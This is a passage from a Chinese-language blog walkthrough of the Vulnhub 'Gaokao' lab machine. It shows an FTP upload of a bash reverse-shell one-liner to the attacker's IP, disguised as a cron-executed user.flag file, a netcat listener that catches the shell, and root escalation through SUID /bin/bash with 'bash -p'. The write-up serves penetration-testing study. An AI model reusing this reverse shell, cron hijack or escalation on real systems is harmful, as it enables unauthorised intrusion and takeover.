+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat reverse.sh </span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.179.83/1234 0&gt;&amp;1</span><br><span class="line">ftp&gt; put reverse.sh</span><br><span class="line">local: reverse.sh remote: reverse.sh</span><br><span class="line">229 Entering Extended Passive Mode (|||58762|)</span><br><span class="line">150 Opening BINARY mode data connection for reverse.sh</span><br><span class="line">100% |<span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span>|    45      255.49 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete</span><br><span class="line">45 bytes sent in 00:00 (6.58 KiB/s)</span><br><span class="line">ftp&gt; mv reverse.sh user.flag</span><br><span class="line">?Invalid command.</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>发现在ftp中没法重命名，我们就在本机改名上传</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># cat user.flag </span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.179.83/1234 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">ftp&gt; put user.flag</span><br><span class="line">local: user.flag remote: user.flag</span><br><span class="line">229 Entering Extended Passive Mode (|||34801|)</span><br><span class="line">150 Opening BINARY mode data connection for user.flag</span><br><span class="line">100% |********************************************************************|   <span class="number"> 55 </span>     383.64 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete</span><br><span class="line">55 bytes sent in 00:00 (5.41 KiB/s)</span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||62805|)</span><br><span class="line">150 Opening ASCII mode data connection for file list</span><br><span class="line">drwxr-xr-x  <span class="number"> 3 </span>sky      sky         <span class="number"> 4096 </span>Feb <span class="number"> 9 </span>11:04 .</span><br><span class="line">drwxr-xr-x  <span class="number"> 5 </span>root     root        <span class="number"> 4096 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>..</span><br><span class="line">-rw-------  <span class="number"> 1 </span>sky      sky           <span class="number"> 56 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bash_history</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky          <span class="number"> 220 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bash_logout</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky         <span class="number"> 3771 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bashrc</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky          <span class="number"> 807 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.profile</span><br><span class="line">-rw-r--r--  <span class="number"> 1 </span>sky      sky           <span class="number"> 45 </span>Feb <span class="number"> 9 </span>11:04 reverse.sh</span><br><span class="line">drwxr-----  <span class="number"> 2 </span>root     root        <span class="number"> 4096 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.ssh</span><br><span class="line">-rwxr-x---  <span class="number"> 1 </span>sky      sarah         <span class="number"> 55 </span>Feb <span class="number"> 9 </span>11:06 user.flag</span><br><span class="line">-rw-------  <span class="number"> 1 </span>sky      sky         <span class="number"> 1489 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.viminfo</span><br><span class="line">226 Transfer complete</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>成功上传，然后在本地监听，得到shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234          </span><br><span class="line">id</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process<span class="built_in"> group </span>(-1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="literal">no</span> job control <span class="keyword">in</span> this shell</span><br><span class="line">bash-4.4$ id</span><br><span class="line"><span class="attribute">uid</span>=1002(sarah) <span class="attribute">gid</span>=1002(sarah) <span class="attribute">groups</span>=1002(sarah)</span><br><span class="line">bash-4.4$ </span><br></pre></td></tr></table></figure></div>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>在这里我卡了很久。<br>先看了一下sudo，但是sudo要密码<br>再查一下suid，我看这里都是&#x2F;bin目录下的，随便选了几个去gtfobins搜了一下就没管了<br>我的思路是首先先用pspy64看一下定时任务<br>我发现了这user.flag是一个定时程序</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">19</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2</span>      | </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">19</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1</span>      | /sbin/init maybe-ubiquity </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">27586</span>  | bash -i /home/sky/user.flag </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">01</span> CMD: UID=<span class="number">1002</span>  PID=<span class="number">27585</span>  | /bin/sh -c bash -i /home/sky/user.flag &gt; /dev/null </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">27584</span>  | /usr/sbin/CRON -f </span><br></pre></td></tr></table></figure></div>
+<p>我就想着是这个定时任务里面有uid&#x3D;0的，而且执行了bash -i &#x2F;home&#x2F;sky&#x2F;user.flag<br>这难道是root也会执行这个定时任务？下面是sarah执行的这个任务，我拿到了sarah的shell<br>但是我在kali里面nc -lp 1234 了好几遍，都是返回sarah的shell。<br>后面经过群主提醒，这个bash的PS1有问题<br>在 Linux 中，PS1（Prompt String 1）是一个环境变量，用来定义 shell 命令提示符的显示内容和格式。一般普通用户的PS1以$结尾，root的以#结尾<br>在这个靶机中的PS1是<code>bash-4.2$</code>，没有显示路径，用户名，说明是一个受限的bash<br>所以用<code>bash -p</code>这个指令就可以得到root的shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">^X-su-<span class="number">4.4</span><span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/bin/bash</span></span><br><span class="line"><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/bin/fusermount</span></span><br><span class="line"><span class="regexp">/bin/ping</span></span><br><span class="line"><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/traceroute</span>6.iputils</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/procmail</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgidmap</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newuidmap</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/pkexec</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/eject</span><span class="regexp">/dmcrypt-get-device</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/snapd</span><span class="regexp">/snap-confine</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/policykit</span>-<span class="number">1</span>/polkit-agent-helper-<span class="number">1</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/x86_64-linux-gnu/lxc</span><span class="regexp">/lxc-user-nic</span></span><br><span class="line"><span class="regexp">-su-4.4$ /bin</span><span class="regexp">/bash</span></span><br><span class="line"><span class="regexp">bash-4.4$ bash -p</span></span><br><span class="line"><span class="regexp">bash-4.4# id</span></span><br><span class="line"><span class="regexp">uid=1002(sarah) gid=1002(sarah) euid=0(root) egid=0(root) groups=0(root),1002(sarah)</span></span><br></pre></td></tr></table></figure></div>
+<p>所以这个&#x2F;bin&#x2F;bash有suid是可以利用的，我直接忽略了。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-p（privileged mode，特权模式）：</span><br><span class="line">默认情况下，Bash 在以 SUID（<span class="keyword">Set</span>-User-ID）或 SGID（<span class="keyword">Set</span>-Group-ID）方式执行时，会自动丢弃 euid 并降权到 <span class="comment">ruid</span> 以避免安全问题。</span><br><span class="line">但是，使用 bash <span class="comment">-p</span> 可以尝试保留 <span class="comment">euid</span>，从而继续以提升的权限运行 <span class="comment">Bash</span>（如果系统允许）。</span><br></pre></td></tr></table></figure></div>
+<p>另外刚才那个定时任务为什么有root的身份执行的行呢？ 原因是这样的：如果拿apache服务举例，发现运行这个服务的不止有www-data的还有root，为什么每次拿到的shell都是www-data的呢？因为root只是负责服务的初始化等内容，这个服务还是归www-data所有的。<br>在这里也是，这个user.flag文件就是由sarah用户执行的。<br>现在我们在root的身份下可以去定时任务里面看看</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bash-<span class="number">4.4</span><span class="comment"># pwd       </span></span><br><span class="line"><span class="regexp">/var/</span>spool<span class="regexp">/cron/</span>crontabs</span><br><span class="line">bash-<span class="number">4.4</span><span class="comment"># ls</span></span><br><span class="line">sarah</span><br><span class="line">bash-<span class="number">4.4</span><span class="comment"># cat sarah </span></span><br><span class="line"><span class="comment"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span></span><br><span class="line"><span class="comment"># (/tmp/crontab.A5TLWA/crontab installed on Sun Jun  6 13:52:29 2021)</span></span><br><span class="line"><span class="comment"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span></span><br><span class="line">*<span class="regexp">/1	*	*	*	*	bash -i /</span>home<span class="regexp">/sky/u</span>ser.flag &gt; <span class="regexp">/dev/</span>null</span><br></pre></td></tr></table></figure></div>
+<p>所以这个任务就是只有sarah这个用户执行的。<br>最后我还从群主ll104567那学到了一个东西，我一直都不知道，叫<code>linpeas.sh</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">linPEAS</span> 是一个用于 Linux 系统的特权提升脚本套件，旨在帮助进行后渗透测试时进行系统枚举和发现特权提升路径。 系统枚举：linPEAS 收集系统的广泛信息，包括用户、组、进程、网络配置、安装的软件等。 特权提升检测：它检查常见的配置错误和漏洞，这些漏洞可能允许攻击者在系统上提升其权限。</span><br></pre></td></tr></table></figure></div>
+<p>运行这个程序之后也能发现bash有可以提权的</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">6(CVE-2011-1485)</span><br><span class="line">-rwsr-sr-x<span class="number"> 1 </span>root   root       1.1M Jun <span class="number"> 6 </span><span class="number"> 2019 </span>/bin/bash</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root   root        19K Jun<span class="number"> 28 </span><span class="number"> 2019 </span>/usr/bin/traceroute6.iputils</span><br></pre></td></tr></table></figure></div>
+<p>运行程序之后这个&#x2F;bin&#x2F;bash是黄底红色的。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/58538.html" title="Vulnhub-Gaokao">https://guayu-kakeru.github.io/posts/58538.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/11143.html" rel="prev" title="HMV-suidy">
+      <i class="fa fa-chevron-left"></i> HMV-suidy
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/49152.html" rel="next" title="HMV-webmaster">
+      HMV-webmaster <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayukakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayukakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/48411.html" title="posts&#x2F;48411.html">HMV-Five</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/38113.html" title="posts&#x2F;38113.html">SWPUCTF_2022新生赛(web)WP</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/50600.html" title="posts&#x2F;50600.html">HMV-insomnia</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62818.html" title="posts&#x2F;62818.html">寒假总结</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/25446.html" title="posts&#x2F;25446.html">SWPUCTF_2021新生赛(web)WP</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
